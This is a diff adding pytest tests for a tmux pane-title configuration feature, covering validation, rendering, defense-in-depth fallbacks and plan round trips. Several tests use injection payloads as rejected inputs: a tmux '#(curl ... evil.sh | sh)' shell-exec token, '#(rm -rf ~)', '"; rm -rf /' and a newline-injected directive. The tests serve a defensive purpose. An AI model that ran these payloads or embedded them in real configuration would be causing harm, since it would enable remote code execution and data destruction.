@@ -158,6 +158,149 @@ def test_tmux_login_shell_shell_must_be_absolute_path():
     validate({"version": 1, "tmux": {"login_shell": {"shell": "/usr/bin/fish"}}})
 
 
+# ── pane_titles config validation ─────────────────────────────────────────────────────────
+def test_tmux_pane_titles_block_accepted():
+    validate({"version": 1, "tmux": {"pane_titles": {"enabled": True, "position": "top", "format": "#{pane_title}"}}})
+    validate({"version": 1, "tmux": {"pane_titles": {"enabled": False}}})
+
+
+def test_tmux_pane_titles_enabled_must_be_bool():
+    with pytest.raises(ConfigError):
+        validate({"version": 1, "tmux": {"pane_titles": {"enabled": "yes"}}})
+
+
+@pytest.mark.parametrize("bad", ["bottom-left", "middle", 1, ["top"]])
+def test_tmux_pane_titles_position_enum_rejected(bad):
+    """A PRESENT non-null `position` must be a valid enum string. `position: null` is treated
+    like every other tmux knob's explicit null — 'use the default' — not an error."""
+    with pytest.raises(ConfigError):
+        validate({"version": 1, "tmux": {"pane_titles": {"position": bad}}})
+
+
+def test_tmux_pane_titles_position_null_falls_back_to_default():
+    validate({"version": 1, "tmux": {"pane_titles": {"position": None}}})
+
+
+@pytest.mark.parametrize("good", ["top", "bottom"])
+def test_tmux_pane_titles_position_enum_accepted(good):
+    validate({"version": 1, "tmux": {"pane_titles": {"position": good}}})
+
+
+def test_tmux_pane_titles_format_must_be_string():
+    with pytest.raises(ConfigError):
+        validate({"version": 1, "tmux": {"pane_titles": {"format": 123}}})
+
+
+@pytest.mark.parametrize(
+    "bad",
+    [
+        '#{pane_title}"',  # closes the tmux double-quoted option value early
+        "#{pane_title}\\",  # can escape into the closing quote
+        "$HOME #{pane_title}",  # tmux expands ${VAR} inside a double-quoted value
+        "#{pane_title}\n set -g status-left 'x'",  # newline injects a second tmux directive
+        "#{pane_title}\r",  # carriage return — also a control char
+        "#{pane_title}\x7f",  # DEL — non-printable, outside the ASCII control range
+        "#{pane_title} #(curl -s evil.sh | sh)",  # tmux's shell-exec format token — RCE, not corruption
+        "#(rm -rf ~)",  # the whole value is a shell-exec token
+    ],
+)
+def test_tmux_pane_titles_format_rejects_unsafe_characters(bad):
+    """A `"`, `\\`, `$`, `#(`, or non-printable character in `format` would corrupt, inject
+    into, or (for `#(`) RUN A SHELL COMMAND from the generated tmux config (review: `#(...)` is
+    tmux's own shell-exec format token — it re-executes on every border render, on a timer, for
+    the life of the server; strictly worse than the corruption cases)."""
+    with pytest.raises(ConfigError):
+        validate({"version": 1, "tmux": {"pane_titles": {"format": bad}}})
+
+
+def test_tmux_pane_titles_format_safe_tokens_accepted():
+    validate(
+        {
+            "version": 1,
+            "tmux": {
+                "pane_titles": {
+                    "format": "#{pane_index}: #{pane_title} [#{session_name}/#{window_name}]"
+                }
+            },
+        }
+    )
+
+
+def test_tmux_pane_titles_format_tab_and_empty_string_accepted():
+    """A bare tab is harmless inside a double-quoted tmux option value (unlike newline/CR); an
+    empty format string is a degenerate-but-safe value (renders `pane-border-format ""`)."""
+    validate({"version": 1, "tmux": {"pane_titles": {"format": "#{pane_title}\t#{pane_index}"}}})
+    validate({"version": 1, "tmux": {"pane_titles": {"format": ""}}})
+
+
+def test_tmux_pane_titles_format_powerline_glyphs_accepted():
+    """A Powerline/Nerd-Font separator glyph (category Co/Cf, NOT a true control character) must
+    be accepted — it cannot corrupt a double-quoted tmux value, and Powerline glyphs are common
+    in a real pane-border-format (review: `str.isprintable()` would have wrongly rejected this)."""
+    validate({"version": 1, "tmux": {"pane_titles": {"format": "#{pane_title}  #{pane_index}"}}})
+
+
+def test_tmux_pane_titles_non_dict_value_raises_config_error_not_raw_exception():
+    """`pane_titles: "top"` (a scalar, not a mapping) must fail as a `ConfigError` with a fix
+    hint — not escape as a raw `TypeError`/`ValueError` from a later `dict(...)` call in
+    plan.py/runner.py that assumes the block already validated as a mapping."""
+    with pytest.raises(ConfigError):
+        validate({"version": 1, "tmux": {"pane_titles": "top"}})
+    with pytest.raises(ConfigError):
+        validate({"version": 1, "tmux": {"pane_titles": ["top"]}})
+
+
+# ── pane_titles format safety: the Python check and the published JSON schema must agree ──────
+@pytest.mark.parametrize(
+    "candidate",
+    [
+        "#{pane_title}",
+        "#{session_name} #{window_index}:#{window_name}#{window_flags}",
+        "#{pane_title}\t#{pane_index}",
+        "",
+        "#{pane_title}  #{pane_index}",  # Powerline glyph — safe
+        "\U0001f600 #{pane_title}",  # emoji — safe
+        '#{pane_title}"',
+        "#{pane_title}\\",
+        "$HOME #{pane_title}",
+        "#{pane_title}\n set -g status-left 'x'",
+        "#{pane_title}\r",
+        "#{pane_title}\x7f",
+        "#{pane_title} #(curl -s evil.sh | sh)",
+        "#(rm -rf ~)",
+        "#{pane_title} injected",  # U+2028 LINE SEPARATOR
+        "#{pane_title} injected",  # U+2029 PARAGRAPH SEPARATOR
+    ],
+)
+def test_pane_titles_format_python_check_matches_json_schema_pattern(candidate):
+    """The two `format`-safety gates — `tmux._pane_titles_format_is_safe` (runtime) and
+    `config_schema.TMUX_PANE_TITLES_FORMAT_UNSAFE_PATTERN` (the published JSON schema, for
+    editors/CI validating rig.yaml offline) — both claim to express the SAME rule. Nothing
+    enforced that claim (review), so run a shared corpus through both and assert identical
+    verdicts on every entry, safe and unsafe alike."""
+    import re
+
+    from riglib import config_schema
+    from riglib.tmux import _pane_titles_format_is_safe
+
+    python_says_safe = _pane_titles_format_is_safe(candidate)
+    schema_says_unsafe = bool(re.search(config_schema.TMUX_PANE_TITLES_FORMAT_UNSAFE_PATTERN, candidate))
+    assert python_says_safe == (not schema_says_unsafe), (
+        f"{candidate!r}: python safe={python_says_safe}, schema unsafe={schema_says_unsafe}"
+    )
+
+
+def test_tmux_pane_titles_clear_status_right_must_be_bool():
+    with pytest.raises(ConfigError):
+        validate({"version": 1, "tmux": {"pane_titles": {"clear_status_right": "yes"}}})
+    validate({"version": 1, "tmux": {"pane_titles": {"clear_status_right": False}}})
+
+
+def test_tmux_pane_titles_unknown_key_rejected():
+    with pytest.raises(ConfigError):
+        validate({"version": 1, "tmux": {"pane_titles": {"postion": "top"}}})  # typo
+
+
 def test_tmux_login_shell_unknown_key_rejected():
     with pytest.raises(ConfigError):
         validate({"version": 1, "tmux": {"login_shell": {"bogus": True}}})
@@ -593,9 +736,165 @@ def test_render_ordering_continuum_hook_is_last_plugin_init():
 
 
 def test_render_moshi_off_omits_status_right_wipe():
-    """Moshi tweaks are a SEPARATE opt-in toggle — off by default they emit no status-right ''."""
-    conf = tmux.build_tmux(repo_home=Path("/home/u"), moshi={"enabled": False}).render_rig_conf()
+    """Moshi tweaks are a SEPARATE opt-in toggle — off by default they emit no status-right ''
+    of their OWN. pane_titles (default-on, a different feature) also clears status-right, so it
+    must be disabled here to isolate what THIS test asserts."""
+    conf = tmux.build_tmux(
+        repo_home=Path("/home/u"), moshi={"enabled": False}, pane_titles={"enabled": False}
+    ).render_rig_conf()
     assert "status-right ''" not in conf and 'status-right ""' not in conf
+
+
+# ── pane_titles rendering ──────────────────────────────────────────────────────────────────
+def test_render_pane_titles_default_on_top_no_date():
+    """Default (no `pane_titles:` block at all): pane-border-status is TOP, a pane-border-format
+    is emitted, and it carries no date/time strftime token — the exact waste Alex flagged."""
+    conf = _plan().render_rig_conf()
+    assert "set -g pane-border-status top" in conf
+    assert "pane-border-format" in conf
+    fmt_line = next(ln for ln in conf.splitlines() if "pane-border-format" in ln)
+    assert "%d" not in fmt_line and "%b" not in fmt_line and "%y" not in fmt_line and "%H" not in fmt_line
+
+
+def test_render_pane_titles_clears_default_clock_date_status_right():
+    """tmux's built-in status-right default (`%H:%M %d-%b-%y`) is wasted space once the pane
+    title carries context — pane_titles (default-on) clears it unconditionally, not just under
+    Moshi's $MOSHI_CLIENT guard."""
+    conf = _plan().render_rig_conf()
+    assert "set -g status-right ''" in conf
+
+
+def test_render_pane_titles_configurable_position():
+    conf = tmux.build_tmux(repo_home=Path("/home/u"), pane_titles={"position": "bottom"}).render_rig_conf()
+    assert "set -g pane-border-status bottom" in conf
+    assert "set -g pane-border-status top" not in conf
+
+
+def test_render_pane_titles_configurable_format():
+    conf = tmux.build_tmux(
+        repo_home=Path("/home/u"), pane_titles={"format": "#{pane_index}: #{pane_title}"}
+    ).render_rig_conf()
+    assert 'pane-border-format "#{pane_index}: #{pane_title}"' in conf
+
+
+def test_render_pane_titles_disabled_omits_everything():
+    conf = tmux.build_tmux(repo_home=Path("/home/u"), pane_titles={"enabled": False}).render_rig_conf()
+    assert "pane-border-status" not in conf
+    assert "pane-border-format" not in conf
+    assert "status-right ''" not in conf
+
+
+def test_render_pane_titles_before_continuum_init():
+    """Same ordering constraint as the Moshi tweak: the status-right clear must land BEFORE
+    continuum's run-shell init, or continuum's own status-right autosave hook would be wiped."""
+    conf = _plan().render_rig_conf()
+    lines = conf.splitlines()
+    pane_titles_idx = next(i for i, ln in enumerate(lines) if "status-right ''" in ln)
+    continuum_init = next(i for i, ln in enumerate(lines) if "continuum.tmux" in ln)
+    assert pane_titles_idx < continuum_init
+
+
+def test_render_pane_titles_clear_status_right_is_a_separate_toggle_from_enabled():
+    """`clear_status_right: false` keeps a border title WITHOUT wiping an existing custom
+    status-right (review: the two must not be fused into one undifferentiated boolean — this is
+    a SEPARATE toggle nested under `enabled`, not fully independent of it; see the next test for
+    the `enabled: false` side)."""
+    conf = tmux.build_tmux(
+        repo_home=Path("/home/u"), pane_titles={"clear_status_right": False}
+    ).render_rig_conf()
+    assert "set -g pane-border-status top" in conf  # the title is still on
+    assert "status-right ''" not in conf  # but status-right is left alone
+
+
+def test_render_pane_titles_enabled_false_makes_clear_status_right_moot():
+    """`enabled: false` disables the whole feature even if `clear_status_right` is left true —
+    there is no border title without `enabled`, so nothing should touch status-right either."""
+    conf = tmux.build_tmux(
+        repo_home=Path("/home/u"), pane_titles={"enabled": False, "clear_status_right": True}
+    ).render_rig_conf()
+    assert "status-right ''" not in conf
+    assert "pane-border-status" not in conf
+
+
+def test_render_pane_titles_moshi_and_clear_status_right_both_before_continuum():
+    """With BOTH pane_titles.clear_status_right and moshi enabled, two `status-right ''` lines
+    are emitted (the unconditional one and the Moshi $MOSHI_CLIENT-guarded one) — EVERY one of
+    them must precede continuum init, not just the first (review: an assertion picking only the
+    first match would miss a regression that reordered the second)."""
+    conf = tmux.build_tmux(repo_home=Path("/home/u"), moshi={"enabled": True}).render_rig_conf()
+    lines = conf.splitlines()
+    status_right_idxs = [i for i, ln in enumerate(lines) if "status-right ''" in ln]
+    assert len(status_right_idxs) == 2
+    continuum_init = next(i for i, ln in enumerate(lines) if "continuum.tmux" in ln)
+    assert all(i < continuum_init for i in status_right_idxs)
+
+
+# ── pane_titles defense-in-depth (build_tmux must not trust a replayed/unvalidated dict) ──────
+def test_build_tmux_clamps_invalid_position_instead_of_rendering_garbage():
+    """`tmux_plan_from_action` rebuilds a plan straight from stored `Action.options`, bypassing
+    `config.validate` entirely (drift checks, a replayed plan, a direct caller). An invalid
+    `position` must be clamped to the default rather than rendered verbatim — an unknown-value
+    `set -g pane-border-status <x>` would make tmux abort parsing the rest of the config."""
+    conf = tmux.build_tmux(
+        repo_home=Path("/home/u"), pane_titles={"position": "sideways"}
+    ).render_rig_conf()
+    assert "set -g pane-border-status top" in conf
+    assert "sideways" not in conf
+
+
+def test_build_tmux_falls_back_to_default_format_on_unsafe_input():
+    """Same defense-in-depth as position: an unsafe `format` (one `config.validate` would have
+    rejected) must fall back to the safe default at render time, not be interpolated verbatim."""
+    conf = tmux.build_tmux(
+        repo_home=Path("/home/u"), pane_titles={"format": '#{pane_title}"; rm -rf /'}
+    ).render_rig_conf()
+    fmt_line = next(ln for ln in conf.splitlines() if "pane-border-format" in ln)
+    assert "rm -rf" not in fmt_line
+
+
+def test_build_tmux_falls_back_to_default_format_on_shell_exec_token():
+    """`#(...)` is tmux's own shell-exec format token — a bypass of `config.validate` carrying
+    one must not reach the renderer verbatim (the highest-severity input class: RCE, not just
+    corruption)."""
+    conf = tmux.build_tmux(
+        repo_home=Path("/home/u"), pane_titles={"format": "#{pane_title} #(curl evil.sh|sh)"}
+    ).render_rig_conf()
+    fmt_line = next(ln for ln in conf.splitlines() if "pane-border-format" in ln)
+    assert "#(" not in fmt_line
+    assert tmux.DEFAULT_PANE_TITLES_FORMAT in fmt_line
+
+
+def test_render_pane_titles_empty_format_renders_empty_pane_border_format():
+    """`format: ""` passes validation (it's safe, just degenerate) and renders verbatim."""
+    conf = tmux.build_tmux(repo_home=Path("/home/u"), pane_titles={"format": ""}).render_rig_conf()
+    assert 'pane-border-format ""' in conf
+
+
+def test_tmux_plan_from_action_on_pre_upgrade_action_defaults_to_new_pane_titles_behavior():
+    """A DRIFT-CHECK REPLAY: `tmux_plan_from_action` on `Action.options` persisted by a version
+    of rig that pre-dates this feature (no `pane_titles` key at all) now renders pane titles ON
+    and clears status-right — the same default a freshly-built plan gets. This is the exact path
+    the defense-in-depth docstrings in `_resolve_pane_titles_position`/`_resolve_pane_titles_format`
+    are written for (review: nothing previously asserted what a pre-upgrade persisted action
+    renders, only what a freshly-built plan's options dict contains)."""
+    from riglib.actions.runner import tmux_plan_from_action
+    from riglib.plan import Action
+
+    action = Action(
+        kind="provision_tmux",
+        category="tmux",
+        item="config",
+        source=Path("/repo"),
+        target=Path("/home/u/.tmux.conf"),
+        options={
+            "conf_path": "/home/u/.tmux.conf",
+            "generated_dir": "/home/u/.config/rig/tmux",
+            # no "pane_titles" key — a pre-upgrade persisted action.
+        },
+    )
+    conf = tmux_plan_from_action(action).render_rig_conf()
+    assert "set -g pane-border-status top" in conf
+    assert "set -g status-right ''" in conf
 
 
 def test_render_moshi_on_guards_under_moshi_client():
@@ -1697,6 +1996,56 @@ def test_plan_emits_tmux_action(fake_agent_tools, tmp_path):
     a = acts[0]
     assert a.category == "tmux" and a.item == "config"
     assert a.options["apply_mode"] == "import"
+
+
+def test_plan_carries_pane_titles_block(fake_agent_tools, tmp_path):
+    plan = _build(
+        {"tmux": {"enabled": True, "pane_titles": {"position": "bottom"}}}, tmp_path, fake_agent_tools
+    )
+    a = [a for a in plan.actions if a.kind == "provision_tmux"][0]
+    assert a.options["pane_titles"] == {"position": "bottom"}
+
+
+def test_plan_defaults_pane_titles_to_empty_dict_when_absent(fake_agent_tools, tmp_path):
+    plan = _build({"tmux": {"enabled": True}}, tmp_path, fake_agent_tools)
+    a = [a for a in plan.actions if a.kind == "provision_tmux"][0]
+    assert a.options["pane_titles"] == {}
+
+
+def test_plan_to_render_round_trip_carries_pane_titles_position(fake_agent_tools, tmp_path):
+    """rig.yaml → plan action → runner's tmux_plan_from_action → render, end to end."""
+    from riglib.actions.runner import tmux_plan_from_action
+
+    plan = _build(
+        {"tmux": {"enabled": True, "pane_titles": {"position": "bottom"}}}, tmp_path, fake_agent_tools
+    )
+    a = next(act for act in plan.actions if act.kind == "provision_tmux")
+    conf = tmux_plan_from_action(a).render_rig_conf()
+    assert "set -g pane-border-status bottom" in conf
+
+
+def test_plan_to_render_round_trip_carries_pane_titles_format_and_clear_status_right(
+    fake_agent_tools, tmp_path
+):
+    from riglib.actions.runner import tmux_plan_from_action
+
+    plan = _build(
+        {
+            "tmux": {
+                "enabled": True,
+                "pane_titles": {
+                    "format": "#{pane_index}: #{pane_title}",
+                    "clear_status_right": False,
+                },
+            }
+        },
+        tmp_path,
+        fake_agent_tools,
+    )
+    a = next(act for act in plan.actions if act.kind == "provision_tmux")
+    conf = tmux_plan_from_action(a).render_rig_conf()
+    assert 'pane-border-format "#{pane_index}: #{pane_title}"' in conf
+    assert "status-right ''" not in conf
 
 
 def test_plan_disables_autosave_off_darwin(fake_agent_tools, tmp_path, monkeypatch):
